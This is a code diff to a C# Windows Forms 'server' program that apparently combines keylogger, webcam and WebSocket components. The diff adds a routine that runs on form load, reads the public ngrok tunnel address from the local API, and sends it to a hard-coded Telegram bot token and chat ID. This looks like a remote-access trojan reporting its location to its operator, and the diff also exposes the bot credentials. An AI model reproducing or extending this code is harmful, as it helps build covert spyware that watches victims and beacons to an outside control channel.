@@ -8,6 +8,9 @@ using System.Threading;
 using Microsoft.Win32;
 using KeyLogger;
 using Fleck;       // Thư viện WebSocket
+using System.Net.Http;
+using System.Threading.Tasks;
+using Newtonsoft.Json.Linq; 
 
 // THƯ VIỆN WEBCAM 
 using AForge.Video;
@@ -34,6 +37,43 @@ namespace server
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
+        }
+
+        // Hàm này sẽ tự động tìm link ngrok và gửi về Telegram
+        public async void GuiLinkVeTelegram()
+        {
+            try
+            {
+                // 1. Đợi 5 giây để Ngrok kịp khởi động và lấy link
+                await Task.Delay(5000);
+
+                using (HttpClient client = new HttpClient())
+                {
+                    // 2. Lấy thông tin từ Ngrok đang chạy trên máy (cổng quản lý mặc định là 4040)
+                    // Lưu ý: Đây là API nội bộ của Ngrok, máy nào chạy ngrok cũng có link này
+                    string jsonNgrok = await client.GetStringAsync("http://localhost:4040/api/tunnels");
+
+                    // 3. Phân tích để lấy đường link Public
+                    JObject data = JObject.Parse(jsonNgrok);
+
+                    // Lấy link TCP (thường nằm trong mảng tunnels)
+                    string publicUrl = data["tunnels"][0]["public_url"].ToString();
+
+                    // 4. Cấu hình Bot Telegram của bạn
+                    string botToken = "8124299251:AAGy1fV1chUEFItCs3XeuO0dO7ko4nYQHCw"; 
+                    string chatId = "7811754859";   
+                    string noiDungTinNhan = $"⚡ Server Online!\nIP: {publicUrl}";
+
+                    // 5. Gửi tin nhắn
+                    string urlTelegram = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={noiDungTinNhan}";
+                    await client.GetAsync(urlTelegram);
+                }
+            }
+            catch (Exception ex)
+            {
+                // Nếu lỗi (ví dụ chưa bật ngrok), nó sẽ im lặng hoặc bạn có thể hiện thông báo để debug
+                //MessageBox.Show("Lỗi gửi tin: " + ex.Message);
+            }
         }
 
         // --- CÁC HÀM XỬ LÝ LOGIC ---
@@ -396,6 +436,11 @@ namespace server
                 Environment.Exit(0);
             }
             catch { }
+        }
+
+        private void server_Load(object sender, EventArgs e)
+        {
+            GuiLinkVeTelegram();
         }
     }
 }
